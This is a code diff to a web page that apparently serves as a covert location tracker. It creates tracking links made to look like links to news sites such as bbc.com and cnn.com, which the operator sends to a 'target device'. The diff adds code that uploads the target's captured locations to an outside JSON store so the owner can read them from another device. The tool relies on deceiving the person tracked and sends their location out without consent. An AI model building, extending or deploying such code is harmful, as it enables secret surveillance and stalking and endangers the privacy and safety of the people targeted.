@@ -1060,13 +1060,98 @@
             if (mode === 'owner') loadLocationHistory();
         }
 
-        // Local Storage Management Functions
+        // JSON Storage API - Using free npoint.io for cross-device sync
+        const API_BASE_URL = 'https://npoint.io';
+
+        // Save location to API (called when target device captures location)
+        async function saveLocationToApi(locationData) {
+            try {
+                // First try to get existing data
+                let existingData = { locations: [] };
+
+                try {
+                    const getResponse = await fetch(`${API_BASE_URL}/json/${window.locationBinId}`, {
+                        method: 'GET',
+                        headers: { 'Content-Type': 'application/json' }
+                    });
+                    if (getResponse.ok) {
+                        existingData = await getResponse.json();
+                    }
+                } catch (e) {
+                    // No existing data, start fresh
+                }
+
+                // Add new location
+                existingData.locations = existingData.locations || [];
+                existingData.locations.push(locationData);
+                existingData.lastUpdated = new Date().toISOString();
+
+                // Save to API
+                const response = await fetch(`${API_BASE_URL}/json/${window.locationBinId}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(existingData)
+                });
+
+                if (response.ok) {
+                    const result = await response.json();
+                    window.locationBinId = result.ref;
+                    localStorage.setItem('locationBinId', window.locationBinId);
+                    console.log('Location saved to API successfully');
+                    return true;
+                }
+            } catch (e) {
+                console.error('Failed to save to API:', e);
+            }
+            return false;
+        }
+
+        // Load locations from API (called when owner checks history)
+        async function loadLocationsFromApi(binId) {
+            try {
+                const response = await fetch(`${API_BASE_URL}/json/${binId}`, {
+                    method: 'GET',
+                    headers: { 'Content-Type': 'application/json' }
+                });
+
+                if (response.ok) {
+                    const data = await response.json();
+                    return data.locations || [];
+                }
+            } catch (e) {
+                console.error('Failed to load from API:', e);
+            }
+            return [];
+        }
+
+        // Get shared bin ID from URL or localStorage
+        function getSharedBinId() {
+            // Check URL first
+            const urlParams = new URLSearchParams(window.location.search);
+            const binFromUrl = urlParams.get('bin');
+
+            if (binFromUrl) {
+                localStorage.setItem('sharedBinId', binFromUrl);
+                return binFromUrl;
+            }
+
+            // Check localStorage
+            return localStorage.getItem('sharedBinId');
+        }
+
+        // Storage Manager with API sync
         const StorageManager = {
             // Save tracking link to localStorage
-            saveTrackingLink: function (data) {
+            saveTrackingLink: async function (data) {
                 const links = JSON.parse(localStorage.getItem('tracking_links') || '[]');
                 links.push(data);
                 localStorage.setItem('tracking_links', JSON.stringify(links));
+
+                // Also save bin ID to share with owner
+                const binId = localStorage.getItem('locationBinId');
+                if (binId) {
+                    data.shared_bin_id = binId;
+                }
             },
 
             // Get tracking link by ID
@@ -1080,18 +1165,48 @@
                 return JSON.parse(localStorage.getItem('tracking_links') || '[]');
             },
 
-            // Save captured location to localStorage
-            saveLocation: function (data) {
+            // Save captured location - NOW WITH API SYNC
+            saveLocation: async function (data) {
+                // Always save to localStorage first
                 const locations = JSON.parse(localStorage.getItem('captured_locations') || '[]');
                 locations.push(data);
                 localStorage.setItem('captured_locations', JSON.stringify(locations));
+
+                // Also try to save to API for cross-device access
+                await saveLocationToApi(data);
             },
 
-            // Get locations by tracking ID
-            getLocationsByTrackingId: function (trackingId) {
-                const locations = JSON.parse(localStorage.getItem('captured_locations') || '[]');
-                return locations.filter(loc => loc.tracking_id === trackingId)
+            // Get locations - NOW WITH API FETCH
+            getLocationsByTrackingId: async function (trackingId) {
+                // First check localStorage
+                const localLocations = JSON.parse(localStorage.getItem('captured_locations') || '[]');
+                const localFiltered = localLocations.filter(loc => loc.tracking_id === trackingId)
                     .sort((a, b) => new Date(b.captured_at) - new Date(a.captured_at));
+
+                // Check if there's a shared bin ID from the tracking link
+                const trackingLink = this.getTrackingLink(trackingId);
+                let apiLocations = [];
+
+                if (trackingLink && trackingLink.shared_bin_id) {
+                    // Fetch from API using shared bin ID
+                    apiLocations = await loadLocationsFromApi(trackingLink.shared_bin_id);
+                    apiLocations = apiLocations.filter(loc => loc.tracking_id === trackingId)
+                        .sort((a, b) => new Date(b.captured_at) - new Date(a.captured_at));
+                }
+
+                // Merge local and API locations, removing duplicates
+                const allLocations = [...localFiltered];
+                apiLocations.forEach(apiLoc => {
+                    const exists = allLocations.some(loc =>
+                        Math.abs(loc.latitude - apiLoc.latitude) < 0.0001 &&
+                        Math.abs(loc.longitude - apiLoc.longitude) < 0.0001
+                    );
+                    if (!exists) {
+                        allLocations.push(apiLoc);
+                    }
+                });
+
+                return allLocations.sort((a, b) => new Date(b.captured_at) - new Date(a.captured_at));
             },
 
             // Get all locations
@@ -1100,7 +1215,7 @@
             }
         };
 
-        // Generate tracking link with localStorage
+        // Generate tracking link with localStorage and API sync
         async function generateTrackingLink() {
             currentTrackId = 'track_' + Math.random().toString(36).substr(2, 12);
 
@@ -1110,30 +1225,44 @@
             const redirectUrlInput = document.getElementById('redirectUrl');
             const redirectUrl = redirectUrlInput ? redirectUrlInput.value.trim() : '';
 
-            // Store in localStorage (no backend needed)
+            // Create or get existing shared bin for this tracking session
+            let sharedBinId = localStorage.getItem('locationBinId');
+            if (!sharedBinId) {
+                // Create a new bin ID for this tracking session
+                sharedBinId = 'track_' + Math.random().toString(36).substr(2, 8);
+                localStorage.setItem('locationBinId', sharedBinId);
+            }
+
+            // Store in localStorage with shared bin ID
             const trackingData = {
                 tracking_id: currentTrackId,
                 device_id: deviceId,
                 disguise: selectedDisguise,
                 redirect_url: redirectUrl,
+                shared_bin_id: sharedBinId,
                 created_at: new Date().toISOString(),
                 is_active: 1
             };
-            StorageManager.saveTrackingLink(trackingData);
+
+            // Save tracking link
+            const links = JSON.parse(localStorage.getItem('tracking_links') || '[]');
+            links.push(trackingData);
+            localStorage.setItem('tracking_links', JSON.stringify(links));
+
             console.log('Tracking link saved to localStorage:', trackingData);
 
             // Also store redirect URL in localStorage for client-side access
             localStorage.setItem('redirect_url_' + currentTrackId, redirectUrl);
 
-            // Generate disguised URL with redirect URL embedded (works without backend)
+            // Generate disguised URL with bin ID embedded (for cross-device sync)
             const baseUrl = window.location.origin + window.location.pathname;
-            const trackingUrl = getDisguisedUrl(baseUrl, currentTrackId, deviceId, selectedDisguise, redirectUrl);
+            const trackingUrl = getDisguisedUrl(baseUrl, currentTrackId, deviceId, selectedDisguise, redirectUrl, sharedBinId);
 
             document.getElementById('trackingLink').value = trackingUrl;
             localStorage.setItem('currentTrackingId', currentTrackId);
             ownerDeviceId = deviceId;
 
-            alert('Tracking link generated and saved locally!');
+            alert('Tracking link generated! Send it to the target device. Locations will be synced to the cloud.');
         }
 
         // Get redirect URL from localStorage (for client-only mode)
@@ -1141,7 +1270,7 @@
             return localStorage.getItem('redirect_url_' + trackingId);
         }
 
-        function getDisguisedUrl(baseUrl, trackId, deviceId, disguise, redirectUrl) {
+        function getDisguisedUrl(baseUrl, trackId, deviceId, disguise, redirectUrl, sharedBinId) {
             // Short, clean disguised URLs that look like real links
             const disguises = {
                 'news': { domains: ['bbc.com', 'cnn.com', 'nytimes.com', 'reuters.com', 'apnews.com'], paths: ['news', 'article', 'world', 'breaking'] },
@@ -1161,13 +1290,18 @@
             // Create very short tracking ID
             const shortId = Math.random().toString(36).substr(2, 4);
 
-            // Build the disguised URL with redirect embedded
-            // Format: baseUrl/#/shortId?trackId&deviceId&redirectUrl
+            // Build the disguised URL with redirect embedded and shared bin ID
+            // Format: baseUrl/#/shortId?trackId&deviceId&redirectUrl&binId
             let trackingUrl = `${baseUrl}/#/${shortId}?t=${trackId}&d=${deviceId}`;
 
             // Embed redirect URL so it works without backend
             if (redirectUrl) {
                 trackingUrl += `&r=${encodeURIComponent(redirectUrl)}`;
+            }
+
+            // Embed shared bin ID for cross-device sync
+            if (sharedBinId) {
+                trackingUrl += `&bin=${sharedBinId}`;
             }
 
             return trackingUrl;
@@ -1342,7 +1476,7 @@
             trackerMap.setView([lat, lng], 15);
         }
 
-        // Load location history from localStorage
+        // Load location history - now with API sync
         async function loadLocationHistory() {
             const logEl = document.getElementById('locationLog');
             if (!logEl) return;
@@ -1353,15 +1487,29 @@
                 return;
             }
 
-            logEl.innerHTML = '<p><em>Loading locations from local storage...</em></p>';
+            logEl.innerHTML = '<p><em>Loading locations from cloud...</em></p>';
 
-            // Read from localStorage instead of API
-            const locations = StorageManager.getLocationsByTrackingId(trackingId);
+            // Get shared bin ID from URL if available
+            const urlParams = new URLSearchParams(window.location.search);
+            const sharedBinIdFromUrl = urlParams.get('bin');
+
+            let locations = [];
+
+            if (sharedBinIdFromUrl) {
+                // If we have a bin ID in URL, fetch from API
+                locations = await loadLocationsFromApi(sharedBinIdFromUrl);
+                locations = locations.filter(loc => loc.tracking_id === trackingId)
+                    .sort((a, b) => new Date(b.captured_at) - new Date(a.captured_at));
+            } else {
+                // Otherwise use StorageManager (checks both local and API)
+                locations = await StorageManager.getLocationsByTrackingId(trackingId);
+            }
 
             let html = '';
             if (!locations || locations.length === 0) {
                 html = '<p><em>No locations captured yet. Send the tracking link to the target device.</em></p>';
             } else {
+                html += `<p style="color: green; font-weight: bold;">✓ Found ${locations.length} location(s)</p>`;
                 locations.forEach((loc, i) => {
                     const date = new Date(loc.captured_at);
                     const sourceIcon = loc.source === 'gps' ? '📍' : '🌐';
